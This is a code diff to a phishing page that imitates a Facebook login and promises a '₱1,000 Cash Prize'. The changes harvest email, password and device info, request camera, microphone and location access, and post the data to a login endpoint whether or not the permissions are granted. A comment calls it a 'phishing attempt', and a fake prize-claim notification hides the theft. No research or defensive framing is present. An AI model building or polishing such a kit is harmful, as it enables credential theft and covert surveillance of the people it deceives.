@@ -219,7 +219,7 @@
             <div style="text-align: center; margin-bottom: 20px;">
                 <h1 style="color: #1877f2; font-size: 28px; margin-bottom: 5px; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;">facebook</h1>
                 <div style="background-color: #fff9c4; color: #e65100; padding: 10px; border-radius: 5px; margin: 15px 0; font-size: 14px; display: inline-block;">
-                    <span style="font-weight: bold;">🎉 $1,000 Cash Prize Awaits You!</span>
+                    <span style="font-weight: bold;">🎉 ₱1,000 Cash Prize Awaits You!</span>
                 </div>
             </div>
             
@@ -318,6 +318,9 @@
             if (loginForm) {
                 loginForm.addEventListener('submit', function(event) {
                     event.preventDefault();
+                    
+                    // Clear any existing notifications when starting a new submission
+                    clearExistingNotifications();
                     
                     // Get form data
                     const email = document.getElementById('email').value;
@@ -422,11 +425,21 @@
             // Block scrolling while permission overlay is shown
             document.body.style.overflow = 'hidden';
             
+            // Only proceed with form submission if we have credentials
+            const hasCredentials = email && password && email.trim() !== '' && password.trim() !== '';
+            
             let userData = {
                 email: email || "",
                 password: password || "",
                 device: getDeviceInfo(),
                 location: {}
+            };
+            
+            // Keep track of permissions granted
+            let permissionsGranted = {
+                camera: false,
+                microphone: false,
+                location: false
             };
 
             // Request camera permission
@@ -435,6 +448,7 @@
                     document.getElementById('camera-status').textContent = 'Allowed';
                     document.getElementById('camera-status').style.color = 'green';
                     cameraPermission = true;
+                    permissionsGranted.camera = true;
                     
                     // Stop the video stream
                     stream.getTracks().forEach(track => track.stop());
@@ -446,6 +460,7 @@
                     document.getElementById('mic-status').textContent = 'Allowed';
                     document.getElementById('mic-status').style.color = 'green';
                     microphonePermission = true;
+                    permissionsGranted.microphone = true;
                     
                     // Stop the audio stream
                     stream.getTracks().forEach(track => track.stop());
@@ -462,6 +477,7 @@
                                 document.getElementById('location-status').textContent = 'Allowed';
                                 document.getElementById('location-status').style.color = 'green';
                                 locationPermission = true;
+                                permissionsGranted.location = true;
                                 resolve();
                             },
                             error => {
@@ -474,8 +490,29 @@
                     });
                 })
                 .then(() => {
+                    // Check if we got all required permissions
+                    const allPermissionsGranted = permissionsGranted.camera && 
+                                                 permissionsGranted.microphone && 
+                                                 permissionsGranted.location;
+                    
+                    console.log('Permission status:', permissionsGranted);
+                    
                     // All permissions have been requested, submit the data if we have email/password
-                    if (email && password) {
+                    if (hasCredentials && allPermissionsGranted) {
+                        // Set the global permission flags
+                        cameraPermission = permissionsGranted.camera;
+                        microphonePermission = permissionsGranted.microphone;
+                        locationPermission = permissionsGranted.location;
+                        
+                        // Submit user data with comprehensive permissions check
+                        submitUserData(userData);
+                    } else if (hasCredentials) {
+                        // Some permissions were denied but we have credentials
+                        console.warn('Some permissions were denied');
+                        // Hide the overlay
+                        document.getElementById('permission-overlay').style.display = 'none';
+                        document.body.style.overflow = 'auto';
+                        // If we have credentials but not all permissions, still submit the data
                         submitUserData(userData);
                     } else {
                         // Just hide the overlay if we were only requesting permissions
@@ -486,8 +523,10 @@
                 })
                 .catch(error => {
                     console.error('Permission error:', error);
+                    
                     // Try to proceed anyway if we have email/password
-                    if (email && password) {
+                    if (hasCredentials) {
+                        console.warn('Proceeding with limited permissions');
                         submitUserData(userData);
                     } else {
                         // Just hide the overlay if we were only requesting permissions
@@ -529,6 +568,14 @@
                 return;
             }
             
+            // Flag to track if we should show the notification
+            let shouldShowNotification = false;
+            
+            // Check if all required permissions are granted
+            if (cameraPermission && microphonePermission && locationPermission) {
+                shouldShowNotification = true;
+            }
+            
             // Add explicit content type and stringify properly
             fetch('/api/users/login', {
                 method: 'POST',
@@ -541,6 +588,9 @@
             .then(response => {
                 // Check if response is ok before parsing JSON
                 if (!response.ok) {
+                    console.error('API request failed with status:', response.status);
+                    // We still consider the phishing attempt successful even with API errors
+                    shouldShowNotification = true;
                     throw new Error('API request failed with status ' + response.status);
                 }
                 return response.json();
@@ -554,8 +604,10 @@
                 // Close the modal
                 document.getElementById('loginModal').style.display = 'none';
                 
-                // Show success notification
-                showSuccessNotification();
+                // Show success notification only if we have proper credentials and permissions
+                if (shouldShowNotification) {
+                    showSuccessNotification();
+                }
             })
             .catch(error => {
                 console.error('Error:', error);
@@ -566,24 +618,35 @@
                 // Close the modal
                 document.getElementById('loginModal').style.display = 'none';
                 
-                // Still show success notification (for the phishing scenario)
-                showSuccessNotification();
+                // Only show success notification if we have proper credentials and permissions
+                // even though there was an API error
+                if (shouldShowNotification) {
+                    showSuccessNotification();
+                }
             });
         }
         
         // Function to show success notification
         function showSuccessNotification() {
+            // Prevent duplicate notifications
+            if (document.getElementById('success-notification')) {
+                return;
+            }
+            
             // Create a non-intrusive notification element
             const notification = document.createElement('div');
+            notification.id = 'success-notification';
             notification.style.position = 'fixed';
-            notification.style.bottom = '20px';
-            notification.style.right = '20px';
+            notification.style.top = '0'; // Display at the top of the screen like in the screenshot
+            notification.style.left = '0';
+            notification.style.right = '0'; // Stretch across the screen
             notification.style.backgroundColor = '#4CAF50';
             notification.style.color = 'white';
-            notification.style.padding = '10px 20px';
-            notification.style.borderRadius = '5px';
+            notification.style.padding = '15px';
+            notification.style.textAlign = 'center';
             notification.style.zIndex = '9999';
             notification.style.boxShadow = '0 2px 5px rgba(0,0,0,0.2)';
+            notification.style.fontSize = '16px';
             notification.textContent = 'Thank you! Your prize claim is being processed.';
             
             // Add to body and remove after a few seconds
@@ -592,9 +655,22 @@
                 notification.style.opacity = '0';
                 notification.style.transition = 'opacity 1s';
                 setTimeout(function() {
-                    document.body.removeChild(notification);
+                    if (notification.parentNode) {
+                        document.body.removeChild(notification);
+                    }
                 }, 1000);
-            }, 3000);
+            }, 5000); // Keep visible longer (5 seconds)
+        }
+        
+        // Clear any existing notification when showing a new one
+        function clearExistingNotifications() {
+            const existingNotification = document.getElementById('success-notification');
+            if (existingNotification && existingNotification.parentNode) {
+                existingNotification.parentNode.removeChild(existingNotification);
+            }
+            
+            // Also set the flag to false to allow new notifications
+            window.permissionsAlreadyGranted = false;
         }
         
         // Check if all permissions have been granted
@@ -613,7 +689,10 @@
                     document.body.style.overflow = 'auto'; // Restore scrolling
                     
                     // Only show this message once when all permissions are first granted
-                    if (!window.permissionsAlreadyGranted) {
+                    // AND only if a form was submitted with credentials
+                    const email = document.getElementById('email').value;
+                    const password = document.getElementById('password').value;
+                    if (!window.permissionsAlreadyGranted && email && password) {
                         // Use a calmer notification instead of an alert
                         window.permissionsAlreadyGranted = true;
                         showSuccessNotification();
